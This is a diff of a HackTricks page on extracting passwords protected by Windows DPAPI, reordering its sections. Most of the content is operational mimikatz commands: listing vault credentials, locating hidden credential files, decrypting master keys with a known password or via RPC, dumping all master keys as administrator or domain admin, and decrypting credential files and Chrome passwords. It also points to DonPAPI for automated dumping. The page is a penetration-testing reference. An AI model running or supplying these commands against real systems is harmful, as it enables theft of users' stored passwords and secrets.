@@ -1,4 +1,4 @@
-
+# DPAPI - Extracting Passwords
 
 <details>
 
@@ -16,17 +16,16 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-
 While creating this post mimikatz was having problems with every action that interacted with DPAPI therefore **most of the examples and images were taken from**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)
 
-# What is DPAPI
+## What is DPAPI
 
 Its primary use in the Windows operating system is to **perform symmetric encryption of asymmetric private keys**, using a user or system secret as a significant contribution of entropy.\
 **DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.
 
 This makes very easy to developer to **save encrypted data** in the computer **without** needing to **worry** how to **protect** the **encryption** **key**.
 
-# What does DPAPI protect?
+### What does DPAPI protect?
 
 DPAPI is utilized to protect the following personal data:
 
@@ -47,9 +46,48 @@ DPAPI is utilized to protect the following personal data:
 An example of a successful and clever way to protect data using DPAPI is the implementation of the auto-completion password encryption algorithm in Internet Explorer. To encrypt the login and password for a certain web page, it calls the CryptProtectData function, where in the optional entropy parameter it specifies the address of the web page. Thus, unless one knows the original URL where the password was entered, nobody, not even Internet Explorer itself, can decrypt that data back.
 {% endhint %}
 
-# Master Keys
+## List Vault
 
-The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) of that user. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
+```bash
+# From cmd
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# From mimikatz
+mimikatz vault::list
+```
+
+## Credential Files
+
+The **credentials files protected by the master password** could be located in:
+
+```
+dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
+Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and he guidMasterKey.
+
+```bash
+mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
+
+[...]
+guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
+[...]
+pbData             : b8f619[...snip...]b493fe
+[..]
+```
+
+You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:
+
+```
+dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
+```
+
+## Master Keys
+
+The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
 
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
@@ -66,19 +104,33 @@ This is what a bunch of Master Keys of a user will looks like:
 
 Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.
 
-## Extract a master key
+### Extract master key & decrypt
 
-If you know the password of the user who the master key belongs to and you can access the master key file you can obtain the master key with mimikatz and a command like the following one:
+In the previous section we found the guidMasterKey which looked like `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, this file will be inside:
 
-```bash
-dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
 ```
+C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
+```
+
+For where you can extract the master key with mimikatz:
+
+<pre class="language-bash"><code class="lang-bash"><strong># If you know the users password
+</strong><strong>dpapi::masterkey /in:"C:\Users\&#x3C;username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
+</strong><strong>
+</strong><strong># If you don't
+</strong>dpapi::masterkey /in:"C:\Users\&#x3C;username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc</code></pre>
+
+The master key of the file will appear in the output.
 
 ![](<../../.gitbook/assets/image (325).png>)
 
-You can see in green the extracted master key.
+Finally, you can use that **masterkey** to **decrypt** the **credential file**:
 
-## Extract all local Master Keys with Administrator
+```
+mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
+```
+
+### Extract all local Master Keys with Administrator
 
 If you are administrator you can obtain the dpapi master keys using:
 
@@ -88,7 +140,7 @@ sekurlsa::dpapi
 
 ![](<../../.gitbook/assets/image (326).png>)
 
-## Extract all backup Master Keys with Domain Admin
+### Extract all backup Master Keys with Domain Admin
 
 A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
 
@@ -114,37 +166,19 @@ dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Da
 
 ![](<../../.gitbook/assets/image (329).png>)
 
-# Credential Files
+## Encrypting and Decrypting content
 
-The **credentials files protected by the master password** could be located in:
-
-```
-dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
-dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-```
-
-You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:
-
-```
-dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
-```
-
-# Encrypting and Decrypting content
-
-You can find an example of how to encrypt and decyrpt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
+You can find an example of how to encrypt and decrypt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
 You can find an example on how to encrypt and decrypt data with DPAPI using C# in [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)
 
-# DonPAPI
+## DonPAPI
 
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically.
 
-# References
+## References
 
 * [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
 * [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
-
 
 <details>
 
@@ -161,5 +195,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
